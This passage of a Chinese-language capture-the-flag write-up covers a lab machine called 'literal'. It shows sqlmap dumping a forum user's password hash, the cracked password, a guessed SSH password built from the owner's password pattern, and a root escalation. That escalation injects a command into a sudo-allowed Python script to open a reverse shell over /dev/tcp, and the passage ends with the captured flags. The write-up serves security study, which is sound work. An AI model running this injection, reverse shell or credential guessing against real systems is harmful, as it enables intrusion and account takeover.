[3] file with list of dictionary files
> 1
[06:15:09] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] y
[06:15:11] [INFO] starting dictionary-based cracking (sha512_generic_passwd)
[06:15:11] [INFO] starting 8 processes 
[06:15:17] [INFO] using suffix '1'                             
[06:15:23] [INFO] using suffix '123'                           
[06:15:30] [INFO] using suffix '2'                             
[06:15:36] [INFO] using suffix '12'                            
[06:15:43] [INFO] using suffix '3'                             
[06:15:51] [INFO] using suffix '13'                            
[06:15:57] [INFO] using suffix '7'                             
[06:16:05] [INFO] using suffix '11'                            
[06:16:12] [INFO] using suffix '5'                             
[06:16:19] [INFO] using suffix '22'                            
[06:16:26] [INFO] using suffix '23'                            
[06:16:33] [INFO] using suffix '01'                            
[06:16:39] [INFO] using suffix '4'                             
[06:16:46] [INFO] using suffix '07'                            
[06:16:53] [INFO] using suffix '21'                            
[06:17:00] [INFO] using suffix '14'                            
[06:17:07] [INFO] using suffix '10'                            
[06:17:13] [INFO] using suffix '06'                            
[06:17:20] [INFO] using suffix '08'                            
[06:17:26] [INFO] using suffix '8'                             
[06:17:33] [INFO] using suffix '15'                            
[06:17:39] [INFO] using suffix '69'                            
[06:17:46] [INFO] using suffix '16'                            
[06:17:52] [INFO] using suffix '6'                             
[06:17:59] [INFO] using suffix '18'                            
[06:18:06] [INFO] using suffix '!'                             
[06:18:13] [INFO] using suffix '.'                             
[06:18:20] [INFO] using suffix '*'                             
[06:18:27] [INFO] using suffix '!!'                            
[06:18:34] [INFO] using suffix '?'                             
[06:18:40] [INFO] using suffix ';'                             
[06:18:47] [INFO] using suffix '..'                            
[06:18:53] [INFO] using suffix '!!!'                           
[06:19:01] [INFO] using suffix ', '                            
[06:19:08] [INFO] using suffix '@'                             
[06:19:15] [WARNING] no clear password(s) found                
Database: forumtesting
Table: forum_owner
[1 entry]
+----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
| id | email                           | created    | password                                                                                                                         | username |
+----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+
| 1  | carlos@forumtesting.literal.htb | 2022-02-12 | 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99 | carlos   |
+----+---------------------------------+------------+----------------------------------------------------------------------------------------------------------------------------------+----------+

[06:19:15] [INFO] table 'forumtesting.forum_owner' dumped to CSV file '/home/kali/.local/share/sqlmap/output/forumtesting.literal.hmv/dump/forumtesting/forum_owner.csv'                        
[06:19:15] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/forumtesting.literal.hmv'      

[*] ending @ 06:19:15 /2025-09-07/
```

 破解得到：carlos:forum100889，但是却登录失败，看了大佬的博客才知道这个联系着社工 

 网站论坛名字为`forumtesting`，社会工程学来看他密码取为`forum100889`是因为对应着平台前五位以及数字，作者的常用密码格式就是xxxxx100889,所以他的ssh密码可能为`ssh100889`

# 提权
```plain
carlos@literal:~$ sudo -l
Matching Defaults entries for carlos on
    literal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following
        commands on literal:
    (root) NOPASSWD:
        /opt/my_things/blog/update_project_status.py
        *
carlos@literal:~$ cat /opt/my_things/blog/update_project_status.py
#!/usr/bin/python3

# Learning python3 to update my project status
## (mental note: This is important, so administrator is my safe to avoid upgrading records by mistake) :P

'''
References:
* MySQL commands in Linux: https://www.shellhacks.com/mysql-run-query-bash-script-linux-command-line/
* Shell commands in Python: https://stackabuse.com/executing-shell-commands-with-python/
* Functions: https://www.tutorialspoint.com/python3/python_functions.htm
* Arguments: https://www.knowledgehut.com/blog/programming/sys-argv-python-examples
* Array validation: https://stackoverflow.com/questions/7571635/fastest-way-to-check-if-a-value-exists-in-a-list
* Valid if root is running the script: https://stackoverflow.com/questions/2806897/what-is-the-best-way-for-checking-if-the-user-of-a-script-has-root-like-privileg
'''

import os
import sys
from datetime import date

# Functions ------------------------------------------------.
def execute_query(sql):
    os.system("mysql -u " + db_user + " -D " + db_name + " -e \"" + sql + "\"")

# Query all rows
def query_all():
    sql = "SELECT * FROM projects;"
    execute_query(sql)

# Query row by ID
def query_by_id(arg_project_id):
    sql = "SELECT * FROM projects WHERE proid = " + arg_project_id + ";"
    execute_query(sql)

# Update database
def update_status(enddate, arg_project_id, arg_project_status):
    if enddate != 0:
        sql = f"UPDATE projects SET prodateend = '" + str(enddate) + "', prostatus = '" + arg_project_status + "' WHERE proid = '" + arg_project_id + "';"
    else:
        sql = f"UPDATE projects SET prodateend = '2222-12-12', prostatus = '" + arg_project_status + "' WHERE proid = '" + arg_project_id + "';"

    execute_query(sql)

# Main program
def main():
    # Fast validation
    try:
        arg_project_id = sys.argv[1]
    except:
        arg_project_id = ""

    try:
        arg_project_status = sys.argv[2]
    except:
        arg_project_status = ""

    if arg_project_id and arg_project_status: # To update
        # Avoid update by error
        if os.geteuid() == 0:
            array_status = ["Done", "Doing", "To do"]
            if arg_project_status in array_status:
                print("[+] Before update project (" + arg_project_id + ")\n")
                query_by_id(arg_project_id)

                if arg_project_status == 'Done':
                    update_status(date.today(), arg_project_id, arg_project_status)
                else:
                    update_status(0, arg_project_id, arg_project_status)
            else:
                print("Bro, avoid a fail: Done - Doing - To do")
                exit(1)

            print("\n[+] New status of project (" + arg_project_id + ")\n")
            query_by_id(arg_project_id)
        else:
            print("Ejejeeey, avoid mistakes!")
            exit(1)

    elif arg_project_id:
        query_by_id(arg_project_id)
    else:
        query_all()

# Variables ------------------------------------------------.
db_user = "carlos"
db_name = "blog"

# Main program
main()
```

```plain
carlos@literal:~$ sudo /opt/my_things/blog/update_project_status.py
+-------+--------------------------------------------------------------+---------------------+------------+-----------+
| proid | proname                                                      | prodatecreated      | prodateend | prostatus |
+-------+--------------------------------------------------------------+---------------------+------------+-----------+
|     1 | Ascii Art Python - ABCdario with colors                      | 2021-09-20 17:51:59 | 2021-09-20 | Done      |
|     2 | Ascii Art Python - Show logos only with letter A             | 2021-09-20 18:06:22 | 2222-12-12 | To do     |
|     3 | Ascii Art Bash - Show musical stores (WTF)                   | 2021-09-20 18:06:50 | 2222-12-12 | To do     |
|     4 | Forum - Add that people can send me bug reports of projects  | 2023-04-07 17:40:41 | 2023-11-01 | Doing     |
|     5 | Validate syntax errors on blog pages                         | 2021-09-20 18:07:43 | 2222-12-12 | Doing     |
|     6 | Script to extract info from files and upload it to any DB    | 2021-09-20 18:07:58 | 2222-12-12 | Doing     |
|     7 | Forum - Implement forum form                                 | 2023-04-07 17:46:38 | 2023-11-01 | Doing     |
|     8 | Add that people can create their own projects on DB          | 2021-09-20 18:49:52 | 2222-12-12 | To do     |
|     9 | Ascii Art C - Start learning Ascii Art with C                | 2021-09-20 18:50:02 | 2222-12-12 | To do     |
|    10 | Ascii Art Bash - Welcome banner preview in blog home         | 2021-09-20 18:50:08 | 2222-12-12 | To do     |
|    11 | Blog - Create login and register form                        | 2023-04-07 17:40:28 | 2023-08-21 | Done      |
|    12 | Blog - Improve the appearance of the dashboard/projects page | 2021-09-20 18:50:18 | 2222-12-12 | Doing     |
+-------+--------------------------------------------------------------+---------------------+------------+-----------+
```

## 分析：
1. **sudo权限**：用户carlos可以以root身份无密码运行 `/opt/my_things/blog/update_project_status.py *`（注意通配符`*`）
2. **脚本漏洞**：脚本使用 `os.system()` 来执行MySQL查询，但没有正确过滤用户输入。

**代码执行点**：在 `execute_query()` 函数中：

3. pythonos.system("mysql -u " + db_user + " -D " + db_name + " -e \"" + sql + "\"")



```plain
sudo /opt/my_things/blog/update_project_status.py '1" && bash -c "bash -i >& /dev/tcp/192.168.0.106/4444 0>&1" #' Doing
```

```plain
(remote) root@literal:/home/carlos# cat user.txt 
6d3c8a6c73cf4f89eea7ae57f6eb9222

(remote) root@literal:/root# cat root.txt 
ca43cb966ef76475d9e0736feeb9f730
```



